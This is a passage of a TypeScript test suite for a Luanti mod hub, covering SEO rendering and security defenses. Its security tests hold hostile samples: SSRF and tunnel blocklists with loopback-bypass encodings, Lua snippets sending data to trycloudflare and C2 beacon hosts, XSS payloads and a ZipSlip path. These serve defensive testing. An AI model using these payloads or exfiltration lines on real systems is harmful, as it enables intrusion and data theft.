    const submitOrganicBtn = submitEl.querySelector('[data-testid="submit-badge-tag-organic"]') as HTMLButtonElement;
    expect(submitOrganicBtn).toBeTruthy();
    expect(submitOrganicBtn.textContent).toContain('100% Organic Code');
    expect(submitOrganicBtn.querySelector('svg[lucideLeaf]')).toBeTruthy();
    submitOrganicBtn.click();
    submitFixture.detectChanges();
    expect(submitFixture.componentInstance.selectedBadgeTags()).toEqual(['organic_code']);
    submitFixture.destroy();
  });

  it('should promote SaKeL packages and /author/SaKeL via Edge SSR, canonical alias resolution, sitemap deduplication, Schema.org JSON-LD, and crawlable links', async () => {
    const { onRequestGet: authorSsrGet } = await import('../../functions/author/[username]');
    const { onRequestGet: packageSsrGet } = await import('../../functions/package/[author]/[name]');
    const sitemapMod = await import('../../functions/sitemap.xml');
    const routesConfig = (await import('../../public/_routes.json')).default;

    // 1. _routes.json includes "/author/*" so Cloudflare Pages invokes Edge SSR for author hubs
    expect(routesConfig.include).toContain('/author/*');

    const sampleShellHtml = `<!doctype html><html><head><title>Default</title><meta name="description" content="" /><meta name="keywords" content="" /><link rel="canonical" id="canonical-link" href="https://luantihub.org/" /><meta property="og:title" content="" /><meta property="og:description" content="" /><meta property="og:url" content="" /><meta property="og:image" content="" /><meta name="twitter:title" content="" /><meta name="twitter:description" content="" /><meta name="twitter:image" content="" /></head><body><main class="sr-only"></main></body></html>`;

    // 2. Edge SSR for /author/sakel-hub canonicalizes to https://luantihub.org/author/SaKeL and injects ProfilePage + ItemList JSON-LD + crawlable package links
    const authorRes = await authorSsrGet({
      request: new Request('https://luantihub.org/author/sakel-hub'),
      params: { username: 'sakel-hub' },
      env: {
        ASSETS: {
          fetch: async () => new Response(sampleShellHtml, { status: 200 })
        }
      }
    });
    expect(authorRes.status).toBe(200);
    const authorHtml = await authorRes.text();
    expect(authorHtml).toContain('<title>SaKeL — Luanti Mods, Games &amp; Texture Packs by SaKeL | Luanti Hub</title>');
    expect(authorHtml).toContain('<link rel="canonical" id="canonical-link" href="https://luantihub.org/author/SaKeL" />');
    expect(authorHtml).toContain('"@type":"ProfilePage"');
    expect(authorHtml).toContain('"@type":"ItemList"');
    expect(authorHtml).toContain('href="/package/SaKeL/everness"');
    expect(authorHtml).toContain('href="/package/SaKeL/x_farming"');
    expect(authorHtml).toContain('href="/package/sakel-hub/x_mobs"');

    // Double-encoded /author/SaKeL%2520Hub 301-redirects cleanly
    const encodedAuthorRes = await authorSsrGet({
      request: new Request('https://luantihub.org/author/SaKeL%2520Test'),
      params: { username: 'SaKeL%2520Test' },
      env: {}
    });
    expect(encodedAuthorRes.status).toBe(301);

    // 3. Edge SSR for /package/sakel-hub/x_mobs resolves SaKeL display name, enriches SoftwareApplication JSON-LD, and renders sibling SaKeL links
    const pkgSsrRes = await packageSsrGet({
      request: new Request('https://luantihub.org/package/sakel-hub/x_mobs'),
      params: { author: 'sakel-hub', name: 'x_mobs' },
      env: {
        ASSETS: {
          fetch: async () => new Response(sampleShellHtml, { status: 200 })
        },
        DB: {
          prepare: (sql: string) => ({
            bind: () => ({
              first: async () =>
                sql.includes('FROM packages')
                  ? {
                      title: 'X Mobs',
                      author_name: 'sakel-hub',
                      name: 'x_mobs',
                      provider: 'github',
                      short_desc: 'Community mobs for Luanti',
                      long_desc: 'Detailed mob behavior and spawning for Luanti.',
                      type: 'mod',
                      license: 'LGPL-2.1-only',
                      downloads_count: 1500
                    }
                  : { avg_rating: 4.9, cnt: 12 }
            })
          })
        }
      }
    });
    expect(pkgSsrRes.status).toBe(200);
    const pkgSsrHtml = await pkgSsrRes.text();
    expect(pkgSsrHtml).toContain('<title>X Mobs by SaKeL — Luanti Mod | Luanti Hub</title>');
    expect(pkgSsrHtml).toContain('SaKeL, sakel-hub');
    expect(pkgSsrHtml).toContain('"name":"SaKeL","alternateName":"sakel-hub","url":"https://luantihub.org/author/SaKeL"');
    expect(pkgSsrHtml).toContain('"downloadUrl":"https://luantihub.org/package/sakel-hub/x_mobs/download"');
    expect(pkgSsrHtml).toContain('More Luanti Packages by <a href="/author/SaKeL">SaKeL</a>');
    expect(pkgSsrHtml).toContain('href="/package/SaKeL/everness"');

    // 4. Sitemap includes /author/SaKeL, prioritizes SaKeL packages at 0.9, and deduplicates sakel-hub/everness vs SaKeL/everness
    const sitemapRes = await sitemapMod.onRequestGet({
      request: new Request('https://luantihub.org/sitemap.xml', { method: 'GET' }),
      env: {
        DB: {
          prepare: (sql: string) => ({
            all: async () =>
              sql.includes('FROM packages')
                ? {
                    results: [
                      {
                        author_name: 'sakel-hub',
                        name: 'everness',
                        provider: 'codeberg',
                        updated_at: '2026-11-01'
                      },
                      {
                        author_name: 'sakel-hub',
                        name: 'x_custom_git_mod',
                        provider: 'github',
                        updated_at: '2026-11-02'
                      }
                    ]
                  }
                : { results: [] }
          })
        }
      }
    });
    expect(sitemapRes.status).toBe(200);
    const sitemapXml = await sitemapRes.text();
    expect(sitemapXml).toContain('<loc>https://luantihub.org/author/SaKeL</loc>');
    expect(sitemapXml).toContain('<loc>https://luantihub.org/package/SaKeL/everness</loc>');
    expect(sitemapXml).not.toContain('<loc>https://luantihub.org/package/sakel-hub/everness</loc>');
    expect(sitemapXml).toContain('<loc>https://luantihub.org/package/sakel-hub/x_custom_git_mod</loc>');

    // 5. Client SeoService resolves SaKeL for sakel-hub packages and generates ProfilePage JSON-LD for /author/SaKeL
    const seo = TestBed.inject(SeoService);
    seo.updateForPackage({
      id: 'sakel-hub/x_mobs',
      author: 'sakel-hub',
      name: 'x_mobs',
      title: 'X Mobs',
      type: 'mod',
      short_desc: 'Community mobs for Luanti',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 1500,
      license: 'LGPL-2.1-only',
      source: 'git',
      tags: ['mobs']
    });
    expect(document.title).toContain('X Mobs by SaKeL — Luanti Mod | Luanti Hub');
    const pkgJsonLd = document.getElementById('luanti-pkg-jsonld')?.textContent || '';
    expect(pkgJsonLd).toContain('"name":"SaKeL"');
    expect(pkgJsonLd).toContain('"url":"https://luantihub.org/author/SaKeL"');

    seo.updateForAuthor(
      {
        username: 'sakel-hub',
        display_name: 'SaKeL',
        avatar_url: 'https://github.com/sakel-hub.png',
        bio: 'Creator of Everness and X Farming',
        identities: []
      },
      [
        {
          id: 'SaKeL/everness',
          author: 'SaKeL',
          name: 'everness',
          title: 'Everness',
          type: 'mod',
          short_desc: 'Custom biomes and dimensions',
          thumbnail: 'logo.svg',
          score: 5,
          downloads: 50000,
          license: 'LGPL-2.1-only',
          source: 'official',
          tags: ['biomes']
        }
      ]
    );
    expect(document.title).toContain('SaKeL — Luanti Mods, Games & Texture Packs by SaKeL | Luanti Hub');
    expect(document.querySelector('link[rel="canonical"]')?.getAttribute('href')).toBe(
      'https://luantihub.org/author/SaKeL'
    );
    const authorJsonLd = document.getElementById('luanti-pkg-jsonld')?.textContent || '';
    expect(authorJsonLd).toContain('"@type":"ProfilePage"');
    expect(authorJsonLd).toContain('"@type":"ItemList"');
    expect(authorJsonLd).toContain('https://luantihub.org/package/SaKeL/everness');

    // Verify fallback ItemList when updateForAuthor is called with empty packages array at initial boot
    seo.updateForAuthor(
      {
        username: 'SaKeL',
        display_name: 'SaKeL',
        avatar_url: 'https://github.com/sakel-hub.png',
        bio: 'Creator of Everness and X Farming',
        identities: []
      },
      []
    );
    const fallbackAuthorJsonLd = document.getElementById('luanti-pkg-jsonld')?.textContent || '';
    expect(fallbackAuthorJsonLd).toContain('https://luantihub.org/package/SaKeL/everness');
    expect(fallbackAuthorJsonLd).toContain('https://luantihub.org/package/SaKeL/x_farming');

    // 6. Verify crawlable <a href="/author/SaKeL"> on PackageCardComponent and PackageDetailModalComponent
    const cardFixture = TestBed.createComponent(PackageCardComponent);
    cardFixture.componentInstance.package = {
      id: 'sakel-hub/x_mobs',
      author: 'sakel-hub',
      author_display_name: 'SaKeL',
      name: 'x_mobs',
      title: 'X Mobs',
      type: 'mod',
      short_desc: 'Community mobs for Luanti',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 1500,
      license: 'LGPL-2.1-only',
      source: 'git',
      tags: ['mobs']
    };
    cardFixture.detectChanges();
    const cardEl = cardFixture.nativeElement as HTMLElement;
    const authorAnchor = cardEl.querySelector('a[href="/author/SaKeL"]') as HTMLAnchorElement;
    expect(authorAnchor).toBeTruthy();
    expect(authorAnchor.textContent).toContain('SaKeL');
    cardFixture.destroy();

    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    expect(modalFixture.componentInstance.getAuthorProfileUrl('sakel-hub')).toBe('/author/SaKeL');
    expect(modalFixture.componentInstance.getAuthorProfileUrl('SaKeL')).toBe('/author/SaKeL');

    // Verify parseSafeMarkdown strips whitespace-less event handlers, <svg onload>, and entity-encoded javascript: URIs
    const safeRendered = String(
      (modalFixture.componentInstance as any).parseSafeMarkdown(
        'Hello **world** [Docs](https://luantihub.org/docs) <img src=x/onerror=alert(1)> <svg onload=alert(1)></svg> <a href="&#106;avascript:alert(1)">bad</a>'
      )
    );
    expect(safeRendered).toContain('<strong>world</strong>');
    expect(safeRendered).toContain('href="https://luantihub.org/docs" rel="noopener noreferrer"');
    expect(safeRendered).not.toContain('onerror');
    expect(safeRendered).not.toContain('<svg');
    expect(safeRendered).not.toContain('javascript:');

    modalFixture.destroy();
  });

  it('should detect and block Cloudflare Quick Tunnels (*.trycloudflare.com), disposable reverse tunnels, SSRF private IPs, and Lua C2 callbacks across all layers', async () => {
    // 1. Layer 1: Shared tunnel & private IP blocklist (isUntrustedTunnelOrPrivateHost)
    expect(isUntrustedTunnelOrPrivateHost('https://random-words-here.trycloudflare.com/attacker/mod')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('sub.cfargotunnel.com')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://abc123.ngrok-free.app/owner/repo')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://evil.ngrok.io/owner/repo')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://tunnel.loca.lt/owner/repo')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://test.serveo.net/owner/repo')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://catcher.webhook.site/track')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://ssrf.oastify.com/ping')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://c2.interact.sh/callback')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('http://127.0.0.1:8080/git/mod')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('http://169.254.169.254/latest/meta-data/')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('http://192.168.1.50/repo/mod')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('http://localhost:3000/repo/mod')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('http://[::1]:8080/repo/mod')).toBe(true);

    // Legitimate public Git forges & self-hosted community instances remain allowed
    expect(isUntrustedTunnelOrPrivateHost('https://github.com/luanti-org/luanti')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('https://codeberg.org/Wuzzy/MineClone2')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('https://git.minetest.land/MineClonia/MineClonia')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('https://gitlab.com/VanessaE/homedecor_modpack')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('https://git.bananach.space/advtrains.git')).toBe(false);

    // 2. detectGitProviderFromUrl, normalizeGitRepoInputUrl, isDefunctGitHost, and sanitizePackageImageUrl
    expect(detectGitProviderFromUrl('https://random-words.trycloudflare.com/attacker/mod')).toBeNull();
    expect(detectGitProviderFromUrl('http://127.0.0.1:8080/attacker/mod')).toBeNull();
    expect(normalizeGitRepoInputUrl('https://random-words.trycloudflare.com/attacker/mod')).toBeUndefined();
    expect(isDefunctGitHost('https://random-words.trycloudflare.com/attacker/mod')).toBe(true);
    expect(sanitizePackageImageUrl('https://evil.trycloudflare.com/pixel.png')).toBeUndefined();
    expect(
      sanitizePackageImageUrl('/api/packages?proxy_image=https%3A%2F%2Fevil.trycloudflare.com%2Fpixel.png')
    ).toBeUndefined();
    expect(sanitizePackageImageUrl('https://content.luanti.org/uploads/valid.png')).toBe(
      'https://content.luanti.org/uploads/valid.png'
    );
    expect(normalizePromoUrl('https://evil.trycloudflare.com/promo.png')).toBeNull();
    expect(normalizePromoUrl('http://127.0.0.1:8080/promo.png')).toBeNull();
    expect(normalizePromoUrl('https://luantihub.org/promo.png')).toBe('https://luantihub.org/promo.png');

    // 3. Layer 2: Inbound Edge Middleware tunnel detection, offensive scanner blocking & security headers
    const tunnelReq = new Request('https://luantihub.org/api/packages', {
      method: 'GET',
      headers: {
        'X-Forwarded-Host': 'phishing-proxy.trycloudflare.com',
        'User-Agent': 'Mozilla/5.0'
      }
    });
    expect(detectInboundEphemeralTunnelHeader(tunnelReq)).toEqual({
      header: 'X-Forwarded-Host',
      value: 'phishing-proxy.trycloudflare.com'
    });
    const blockedTunnelRes = await edgeMiddleware({
      request: tunnelReq,
      next: async () => new Response('OK', { status: 200 }),
      env: {}
    });
    expect(blockedTunnelRes.status).toBe(403);
    expect(blockedTunnelRes.headers.get('X-Content-Type-Options')).toBe('nosniff');
    expect(blockedTunnelRes.headers.get('X-Frame-Options')).toBe('SAMEORIGIN');

    const scannerReq = new Request('https://luantihub.org/api/packages', {
      method: 'GET',
      headers: {
        'User-Agent': 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)'
      }
    });
    const blockedScannerRes = await edgeMiddleware({
      request: scannerReq,
      next: async () => new Response('OK', { status: 200 }),
      env: {}
    });
    expect(blockedScannerRes.status).toBe(403);

    // 4. Layer 3: Static Lua audit (E901 request_insecure_environment / loadlib + E902 tunnel C2 endpoints)
    const maliciousLua = [
      'local modname = core.get_current_modname()',
      'local ie = core.request_insecure_environment()',
      'local http = core.request_http_api()',
      'http.fetch({ url = "https://exfil-data.trycloudflare.com/collect" }, function() end)'
    ].join('\n');
    const luaDiagnostics = runLuacheckStaticAudit(maliciousLua, 'evil_mod');
    expect(
      luaDiagnostics.some(
        d => d.code === 'LUA_SANDBOX_VIOLATION (E901)' && d.title.includes('core.request_insecure_environment')
      )
    ).toBe(true);
    expect(
      luaDiagnostics.some(
        d =>
          d.code === 'LUA_SUSPICIOUS_TUNNEL_ENDPOINT (E902)' &&
          d.title.includes('exfil-data.trycloudflare.com')
      )
    ).toBe(true);
  });

  it('should enforce canonicalized SSRF/tunnel blocking, hop-by-hop redirect validation, and extended Lua C2 tunnel detection', async () => {
    const { fetchWithAnubisSupport } = await import('../../functions/api/lib/upstream');

    // 1. WHATWG URL canonicalized IPv4 / IPv6 / userinfo / trailing-dot / wildcard DNS / tunnel checks
    expect(isUntrustedTunnelOrPrivateHost('http://0177.0.0.1/')).toBe(true); // Octal loopback
    expect(isUntrustedTunnelOrPrivateHost('http://0x7f000001/')).toBe(true); // Hex loopback
    expect(isUntrustedTunnelOrPrivateHost('http://2130706433/')).toBe(true); // Integer loopback
    expect(isUntrustedTunnelOrPrivateHost('http://127.1/')).toBe(true); // Shorthand loopback
    expect(isUntrustedTunnelOrPrivateHost('http://[::ffff:7f00:1]/')).toBe(true); // Hex IPv4-mapped IPv6
    expect(isUntrustedTunnelOrPrivateHost('https://github.com@127.0.0.1/owner/repo')).toBe(true); // Userinfo spoof
    expect(isUntrustedTunnelOrPrivateHost('https://evil.trycloudflare.com./owner/repo')).toBe(true); // Trailing dot FQDN
    expect(isUntrustedTunnelOrPrivateHost('https://node1.tail9999.ts.net/owner/repo')).toBe(true); // Tailscale Funnel
    expect(isUntrustedTunnelOrPrivateHost('https://147.185.221.20.ply.gg/owner/repo')).toBe(true); // playit.gg
    expect(isUntrustedTunnelOrPrivateHost('https://tunnel.devtunnels.ms/owner/repo')).toBe(true); // VS Code Dev Tunnels
    expect(isUntrustedTunnelOrPrivateHost('https://127.0.0.1.nip.io/owner/repo')).toBe(true); // DNS rebinding
    expect(isUntrustedTunnelOrPrivateHost('https://169-254-169-254.sslip.io/latest/meta-data')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('https://203.0.113.42/owner/repo')).toBe(true); // Raw IPv4 literal

    // Trusted public Git forges & ContentDB remain allowed
    expect(isUntrustedTunnelOrPrivateHost('https://github.com/luanti-org/luanti')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('https://codeberg.org/Wuzzy/Lazarr')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('https://content.luanti.org/packages/Wuzzy/mineclone2/')).toBe(false);

    // 2. Inbound tunnel header detection covers modern ephemeral tunnels (Tailscale, playit, devtunnels, cloudflared)
    const tsReq = new Request('https://luantihub.org/api/packages', {
      headers: { 'X-Original-Host': 'backdoor.ts.net' }
    });
    expect(detectInboundEphemeralTunnelHeader(tsReq)).not.toBeNull();
    const blockedTsRes = await edgeMiddleware({
      request: tsReq,
      next: async () => new Response('OK', { status: 200 }),
      env: {}
    });
    expect(blockedTsRes.status).toBe(403);
    expect(blockedTsRes.headers.get('Strict-Transport-Security')).toContain('max-age=31536000');

    // 3. Hop-by-hop redirect validation blocks 302 redirects from a trusted forge to a tunnel or loopback target
    const origFetch = globalThis.fetch;
    let tunnelCalled = false;
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (urlStr === 'https://github.com/evil/mod/releases/download/v1/mod.zip') {
        return new Response(null, {
          status: 302,
          headers: { Location: 'https://c2-drop.trycloudflare.com/payload.zip' }
        });
      }
      if (urlStr.includes('trycloudflare.com')) {
        tunnelCalled = true;
      }
      return new Response('OK', { status: 200 });
    }) as typeof fetch;

    try {
      const bounceRes = await fetchWithAnubisSupport('https://github.com/evil/mod/releases/download/v1/mod.zip');
      expect(bounceRes.status).toBe(403);
      expect(bounceRes.headers.get('X-LuantiHub-Redirect-Blocked')).toBe('1');
      expect(tunnelCalled).toBe(false);
    } finally {
      globalThis.fetch = origFetch;
    }

    // 4. Lua static audit catches extended C2 tunnel domains (ts.net / playit.gg / devtunnels.ms)
    const c2Lua = 'local h = core.request_http_api()\nh.fetch({ url = "https://botnet.ts.net/beacon" }, function() end)';
    const c2Diags = runLuacheckStaticAudit(c2Lua, 'c2_mod');
    expect(c2Diags.some(d => d.code === 'LUA_SUSPICIOUS_TUNNEL_ENDPOINT (E902)')).toBe(true);
  });

  it('should block PATCH ownership hijack via spoofed repo_url, block ?repo= poisoning, and prevent unverified claims from 451-delisting ContentDB packages', async () => {
    const { onRequestGet: readmeOnRequestGet } = await import('../../functions/api/packages/[author]/[name]/readme');
    const { onRequestGet: releasesOnRequestGet } = await import('../../functions/api/packages/[author]/[name]/releases');
    const secret = 'test-anti-hijack-secret-2026';

    // Attacker owns github:attacker_user, tries to hijack Wuzzy/mineclone2 by sending body.repo_url = https://github.com/attacker_user/mineclone2
    const attackerToken = await createSessionToken('usr_attacker', secret, {
      username: 'attacker_user',
      verified: true
    });

    const insertedPackages: any[] = [];
    const mockDb: any = {
      prepare(sql: string) {
        return {
          bind(...args: any[]) {
            return {
              async first() {
                if (sql.includes('FROM users WHERE id = ?')) {
                  return { id: 'usr_attacker', username: 'attacker_user', display_name: 'Attacker' };
                }
                return null;
              },
              async all() {
                if (sql.includes('FROM user_identities')) {
                  return {
                    results: [
                      {
                        provider: 'github',
                        provider_username: 'attacker_user',
                        access_token: 'gho_verified_attacker'
                      }
                    ]
                  };
                }
                return { results: [] };
              },
              async run() {
                if (sql.includes('INSERT INTO packages')) {
                  insertedPackages.push({ sql, args });
                }
                return { success: true };
              }
            };
          }
        };
      }
    };

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (urlStr.includes('content.luanti.org/api/packages/Wuzzy/mineclone2')) {
        return new Response(
          JSON.stringify({
            author: 'Wuzzy',
            name: 'mineclone2',
            title: 'VoxeLibre',
            type: 'game',
            repo: 'https://git.minetest.land/VoxeLibre/VoxeLibre'
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (urlStr.includes('content.luanti.org/api/packages/?')) {
        return new Response(
          JSON.stringify([
            {
              author: 'Wuzzy',
              name: 'mineclone2',
              title: 'VoxeLibre',
              type: 'game'
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (urlStr.includes('api.github.com/repos/attacker_user/mineclone2')) {
        return new Response(
          JSON.stringify({ default_branch: 'main', owner: { login: 'attacker_user' }, name: 'mineclone2' }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (urlStr.includes('raw.githubusercontent.com/attacker_user/mineclone2')) {
        if (urlStr.endsWith('mod.conf')) {
          return new Response('name = mineclone2\ntitle = Spoofed\ndescription = Spoofed mod\n', { status: 200 });
        }
        if (urlStr.endsWith('init.lua')) {
          return new Response('-- clean lua\n', { status: 200 });
        }
        if (urlStr.endsWith('LICENSE')) {
          return new Response('MIT License\nPermission is hereby granted, free of charge', { status: 200 });
        }
        return new Response('', { status: 404 });
      }
      return new Response('{}', { status: 404 });
    }) as typeof fetch;

    try {
      // 1. PATCH hijack attempt must be rejected with 403 and zero D1 package inserts
      const hijackPatchRes = await packageDetailOnRequestPatch({
        request: new Request('https://luantihub.org/api/packages/Wuzzy/mineclone2', {
          method: 'PATCH',
          headers: {
            'Content-Type': 'application/json',
            Cookie: `lh_session=${attackerToken}`
          },
          body: JSON.stringify({
            repo_url: 'https://github.com/attacker_user/mineclone2',
            tags: ['pwned']
          })
        }),
        params: { author: 'Wuzzy', name: 'mineclone2' },
        env: { DB: mockDb, SESSION_SECRET: secret }
      });
      expect(hijackPatchRes.status).toBe(403);
      expect(insertedPackages.length).toBe(0);

      // 2. ?repo= pointing to an unrelated owner/repo must be ignored on readme.ts & releases.ts
      const poisonedReadmeRes = await readmeOnRequestGet({
        request: new Request(
          'https://luantihub.org/api/packages/UnknownUser/unknown_mod/readme?repo=' +
            encodeURIComponent('https://github.com/attacker_user/evil_phishing_readme')
        ),
        params: { author: 'UnknownUser', name: 'unknown_mod' },
        env: { DB: mockDb }
      });
      expect(poisonedReadmeRes.status).toBe(200);
      const poisonedReadmeJson = await poisonedReadmeRes.json();
      expect(poisonedReadmeJson.readme).toBeNull();

      const poisonedReleasesRes = await releasesOnRequestGet({
        request: new Request(
          'https://luantihub.org/api/packages/UnknownUser/unknown_mod/releases?repo=' +
            encodeURIComponent('https://github.com/attacker_user/evil_phishing_readme')
        ),
        params: { author: 'UnknownUser', name: 'unknown_mod' },
        env: { DB: mockDb }
      });
      expect(poisonedReleasesRes.status).toBe(200);
      const poisonedReleasesJson = await poisonedReleasesRes.json();
      expect(poisonedReleasesJson).toEqual([]);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should block SVG/HTML XSS payloads in ?proxy_image=, fail closed when SESSION_SECRET is unset, require OAuth state cookies, and sanitize ZipSlip paths', async () => {
    const { onRequestGet: packagesIndexGet } = await import('../../functions/api/packages/index');
    const { onRequestGet: oauthCallbackGet } = await import('../../functions/api/auth/[provider]/callback');
    const { normalizeLuantiPackageZip } = await import('../../functions/api/lib/upstream');

    // 1. Missing SESSION_SECRET fails closed across JWT, OAuth state, and Audit Proof tokens
    await expect(createSessionToken('usr_1', undefined)).rejects.toThrow();
    expect(await verifySessionToken('fake.sig', undefined)).toBeNull();
    expect(await verifySessionTokenClaims('fake.sig', '')).toBeNull();
    expect(await verifyOAuthStateToken('fake.sig', 'github', undefined)).toBe(false);
    expect(await verifyAuditProofToken('fake.sig', 'github:a/b', undefined)).toBe(false);

    // 2. OAuth callback rejects valid HMAC state when the browser lacks the matching lh_oauth_state cookie (login-CSRF / account-link defense)
    const secret = 'oauth-cookie-bind-secret-2026';
    const validState = await createOAuthStateToken('github', secret);
    const missingCookieRes = await oauthCallbackGet({
      params: { provider: 'github' },
      request: new Request(
        `https://luantihub.org/api/auth/github/callback?code=csrf_code&state=${encodeURIComponent(validState)}`
      ),
      env: {
        GITHUB_CLIENT_ID: 'cid',
        GITHUB_CLIENT_SECRET: 'csec',
        SESSION_SECRET: secret
      }
    });
    expect(missingCookieRes.status).toBe(302);
    expect(missingCookieRes.headers.get('Location')).toContain('auth_error=session_expired');

    // 3. GET /api/packages?proxy_image= blocks SVG XSS payloads (even with spoofed image/png header) and serves valid PNGs with strict CSP sandbox
    const valid1x1Png = new Uint8Array([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
      0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
      0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
      0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
      0x89, 0x00, 0x00, 0x00, 0x0a, 0x49, 0x44, 0x41,
      0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00,
      0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00,
      0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae,
      0x42, 0x60, 0x82
    ]);

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (urlStr.includes('evil.svg')) {
        return new Response('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>', {
          status: 200,
          headers: { 'Content-Type': 'image/png' }
        });
      }
      if (urlStr.includes('safe.png')) {
        return new Response(valid1x1Png, {
          status: 200,
          headers: { 'Content-Type': 'image/png' }
        });
      }
      return new Response('Not found', { status: 404 });
    }) as typeof fetch;

    try {
      const svgXssRes = await packagesIndexGet({
        request: new Request(
          'https://luantihub.org/api/packages?proxy_image=' +
            encodeURIComponent('https://raw.githubusercontent.com/owner/repo/main/evil.svg')
        ),
        env: {}
      } as any);
      expect(svgXssRes.status).toBe(404);
      expect(await svgXssRes.text()).not.toContain('<svg');

      const disallowedHostRes = await packagesIndexGet({
        request: new Request(
          'https://luantihub.org/api/packages?proxy_image=' +
            encodeURIComponent('https://untrusted-random-cdn.example.com/pic.png')
        ),
        env: {}
      } as any);
      expect(disallowedHostRes.status).toBe(403);

      const safePngRes = await packagesIndexGet({
        request: new Request(
          'https://luantihub.org/api/packages?proxy_image=' +
            encodeURIComponent('https://raw.githubusercontent.com/owner/repo/main/safe.png')
        ),
        env: {}
      } as any);
      expect(safePngRes.status).toBe(200);
      expect(safePngRes.headers.get('Content-Type')).toBe('image/png');
      expect(safePngRes.headers.get('Content-Security-Policy')).toContain("default-src 'none'");
      expect(safePngRes.headers.get('Content-Security-Policy')).toContain('sandbox');
      expect(safePngRes.headers.get('X-Content-Type-Options')).toBe('nosniff');
    } finally {
      globalThis.fetch = origFetch;
    }

    // 4. ZipSlip path traversal entries (`../../etc/passwd`) are stripped/dropped during normalizeLuantiPackageZip
    const enc = new TextEncoder();
    const dec = new TextDecoder();
    const buildStoredZip = (files: Record<string, string>): Uint8Array => {
      const localParts: Uint8Array[] = [];
      const cdParts: Uint8Array[] = [];
      let localOffset = 0;
      const names = Object.keys(files);
      for (const name of names) {
        const nameBytes = enc.encode(name);
        const dataBytes = enc.encode(files[name]);
        const lfh = new Uint8Array(30 + nameBytes.length + dataBytes.length);
        const lfhView = new DataView(lfh.buffer);
        lfhView.setUint32(0, 0x04034b50, true);
        lfhView.setUint16(4, 20, true);
        lfhView.setUint32(18, dataBytes.length, true);
        lfhView.setUint32(22, dataBytes.length, true);
        lfhView.setUint16(26, nameBytes.length, true);
        lfh.set(nameBytes, 30);
        lfh.set(dataBytes, 30 + nameBytes.length);
        localParts.push(lfh);

        const cdh = new Uint8Array(46 + nameBytes.length);
        const cdhView = new DataView(cdh.buffer);
        cdhView.setUint32(0, 0x02014b50, true);
        cdhView.setUint16(4, 20, true);
        cdhView.setUint16(6, 20, true);
        cdhView.setUint32(20, dataBytes.length, true);
        cdhView.setUint32(24, dataBytes.length, true);
        cdhView.setUint16(28, nameBytes.length, true);
        cdhView.setUint32(42, localOffset, true);
        cdh.set(nameBytes, 46);
        cdParts.push(cdh);

        localOffset += lfh.length;
      }
      const cdSize = cdParts.reduce((s, p) => s + p.length, 0);
      const eocd = new Uint8Array(22);
      const eocdView = new DataView(eocd.buffer);
      eocdView.setUint32(0, 0x06054b50, true);
      eocdView.setUint16(8, names.length, true);
      eocdView.setUint16(10, names.length, true);
      eocdView.setUint32(12, cdSize, true);
      eocdView.setUint32(16, localOffset, true);

      const out = new Uint8Array(localOffset + cdSize + 22);
      let pos = 0;
      for (const p of [...localParts, ...cdParts, eocd]) {
        out.set(p, pos);
        pos += p.length;
      }
      return out;
    };
    const listZipCentralDirPaths = (zip: Uint8Array): string[] => {
      const view = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
      let eocdPos = -1;
      for (let i = zip.length - 22; i >= 0; i--) {
        if (view.getUint32(i, true) === 0x06054b50) {
          eocdPos = i;
          break;
        }
      }
      if (eocdPos < 0) return [];
      const count = view.getUint16(eocdPos + 10, true);
      let pos = view.getUint32(eocdPos + 16, true);
      const paths: string[] = [];
      for (let i = 0; i < count; i++) {
        const fnLen = view.getUint16(pos + 28, true);
        const exLen = view.getUint16(pos + 30, true);
        const cmLen = view.getUint16(pos + 32, true);
        paths.push(dec.decode(zip.subarray(pos + 46, pos + 46 + fnLen)));
        pos += 46 + fnLen + exLen + cmLen;
      }
      return paths;
    };

    const maliciousZip = buildStoredZip({
      'repo-main/mod.conf': 'name = safe_mod\n',
